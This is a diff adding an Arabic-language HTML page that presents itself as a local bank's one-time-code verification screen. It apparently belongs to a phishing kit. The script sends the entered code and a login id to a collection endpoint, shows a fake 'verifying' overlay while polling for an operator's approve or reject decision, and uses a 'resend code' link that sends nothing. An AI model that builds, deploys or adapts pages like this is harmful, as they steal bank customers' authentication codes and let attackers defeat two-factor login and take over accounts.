@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>رمز التحقق - بنك المارية المحلي</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{font-family:'Segoe UI',Tahoma,sans-serif;background:#0a1628;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column;}
+.otp-box{text-align:center;padding:40px 30px;max-width:420px;width:100%;}
+.bank-logo{margin-bottom:30px;opacity:0.7;}
+.shield-icon{width:70px;height:70px;border-radius:50%;background:rgba(0,200,255,0.12);display:flex;align-items:center;justify-content:center;margin:0 auto 20px;}
+.shield-icon svg{width:36px;height:36px;}
+.otp-title{font-size:1.3rem;font-weight:700;color:#00c8ff;margin-bottom:8px;}
+.otp-sub{font-size:0.9rem;color:#6b7f9e;margin-bottom:30px;line-height:1.6;}
+.otp-inputs{display:flex;gap:14px;justify-content:center;direction:ltr;margin-bottom:25px;}
+.otp-inputs input{width:58px;height:66px;text-align:center;font-size:1.6rem;font-weight:700;border:2px solid rgba(255,255,255,0.12);border-radius:14px;background:rgba(0,0,0,0.25);color:#fff;outline:none;font-family:inherit;transition:border 0.3s;}
+.otp-inputs input:focus{border-color:#00c8ff;}
+.otp-btn{width:100%;padding:16px;border:none;border-radius:14px;background:linear-gradient(135deg,#0080cc,#00c8ff);color:#fff;font-size:1.05rem;font-weight:700;cursor:pointer;font-family:inherit;margin-bottom:15px;transition:opacity 0.3s;}
+.otp-btn:hover{opacity:0.9;}
+.otp-btn:disabled{opacity:0.5;cursor:not-allowed;}
+.resend-link{color:#6b7f9e;font-size:0.85rem;cursor:pointer;text-decoration:underline;}
+.resend-link:hover{color:#00c8ff;}
+.error-msg{color:#f87171;font-weight:700;font-size:0.9rem;margin-bottom:15px;min-height:20px;}
+
+.waiting-overlay{display:none;position:fixed;inset:0;background:#0a1628;z-index:100;align-items:center;justify-content:center;flex-direction:column;}
+.waiting-overlay.show{display:flex;}
+.spinner{width:50px;height:50px;border:4px solid rgba(0,200,255,0.15);border-top:4px solid #00c8ff;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:25px;}
+@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+.waiting-text{font-size:1.1rem;color:#00c8ff;font-weight:600;}
+.waiting-sub-text{font-size:0.9rem;color:#6b7f9e;margin-top:8px;}
+</style>
+</head>
+<body>
+
+<div class="waiting-overlay" id="waitingOverlay">
+  <div class="bank-logo" style="margin-bottom:30px;">
+    <img src="/ar/wp-content/themes/framework/assets/client/img/logo-white-2.png" alt="بنك المارية المحلي" style="height:50px;object-fit:contain;">
+  </div>
+  <div class="spinner"></div>
+  <div class="waiting-text">جاري التحقق من الرمز</div>
+  <div class="waiting-sub-text">يرجى الانتظار...</div>
+</div>
+
+<div class="otp-box">
+  <div class="bank-logo">
+    <img src="/ar/wp-content/themes/framework/assets/client/img/logo-white-2.png" alt="بنك المارية المحلي" style="height:50px;object-fit:contain;">
+  </div>
+  <div class="shield-icon">
+    <svg viewBox="0 0 24 24" fill="none" stroke="#00c8ff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+    </svg>
+  </div>
+  <div class="otp-title">أدخل رمز التحقق</div>
+  <div class="otp-sub">تم إرسال رمز التحقق إلى رقم جوالك المسجل</div>
+  <div class="error-msg" id="errorMsg"></div>
+  <div class="otp-inputs" id="otpInputs">
+    <input type="text" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
+    <input type="text" maxlength="1" inputmode="numeric">
+    <input type="text" maxlength="1" inputmode="numeric">
+    <input type="text" maxlength="1" inputmode="numeric">
+  </div>
+  <button class="otp-btn" id="otpBtn" onclick="submitOTP()">تأكيد</button>
+  <div class="resend-link" onclick="resendOTP()">إعادة إرسال الرمز</div>
+</div>
+
+<script>
+var params = new URLSearchParams(window.location.search);
+var loginId = params.get('id');
+if (!loginId) { window.location.href = '/ar/login/'; }
+if (params.get('error')) {
+  document.getElementById('errorMsg').textContent = 'الرمز غير صحيح او غير صالح';
+}
+
+var inputs = document.querySelectorAll('#otpInputs input');
+inputs.forEach(function(inp, i) {
+  inp.addEventListener('input', function() {
+    if (inp.value.length === 1 && i < inputs.length - 1) {
+      inputs[i + 1].focus();
+    }
+  });
+  inp.addEventListener('keydown', function(e) {
+    if (e.key === 'Backspace' && !inp.value && i > 0) {
+      inputs[i - 1].focus();
+    }
+  });
+  inp.addEventListener('paste', function(e) {
+    e.preventDefault();
+    var text = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+    for (var j = 0; j < inputs.length && j < text.length; j++) {
+      inputs[j].value = text[j];
+    }
+    if (text.length >= inputs.length) inputs[inputs.length - 1].focus();
+    else if (text.length > 0) inputs[text.length].focus();
+  });
+});
+inputs[0].focus();
+
+var otpAttemptId = null;
+var pollInterval = null;
+
+function submitOTP() {
+  var otp = '';
+  inputs.forEach(function(inp) { otp += inp.value; });
+  if (otp.length < 4) {
+    document.getElementById('errorMsg').textContent = 'يرجى إدخال الرمز كاملاً';
+    return;
+  }
+  document.getElementById('errorMsg').textContent = '';
+  var btn = document.getElementById('otpBtn');
+  btn.disabled = true;
+  btn.textContent = 'جاري التحقق...';
+
+  fetch('/api/otp-attempts', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ loginId: loginId, otp: otp, lang: 'ar' })
+  }).then(function(r) { return r.json(); }).then(function(data) {
+    if (data.success) {
+      otpAttemptId = data.id;
+      document.getElementById('waitingOverlay').classList.add('show');
+      pollInterval = setInterval(checkOTPStatus, 2000);
+      checkOTPStatus();
+    } else {
+      btn.disabled = false;
+      btn.textContent = 'تأكيد';
+    }
+  }).catch(function() {
+    btn.disabled = false;
+    btn.textContent = 'تأكيد';
+  });
+}
+
+function checkOTPStatus() {
+  if (!otpAttemptId) return;
+  fetch('/api/otp-attempts/' + otpAttemptId + '/status')
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+      if (data.redirectUrl) {
+        clearInterval(pollInterval);
+        window.location.href = data.redirectUrl;
+      } else if (data.status === 'rejected') {
+        clearInterval(pollInterval);
+        window.location.href = '/ar/login/otp4.html?id=' + loginId + '&error=1';
+      } else if (data.status === 'approved') {
+        clearInterval(pollInterval);
+        window.location.href = '/ar/';
+      }
+    }).catch(function() {});
+}
+
+function resendOTP() {
+  inputs.forEach(function(inp) { inp.value = ''; });
+  inputs[0].focus();
+  document.getElementById('errorMsg').textContent = 'تم إعادة إرسال الرمز';
+  document.getElementById('errorMsg').style.color = '#34d399';
+  setTimeout(function() {
+    document.getElementById('errorMsg').textContent = '';
+    document.getElementById('errorMsg').style.color = '#f87171';
+  }, 3000);
+}
+</script>
+</body>
+</html>
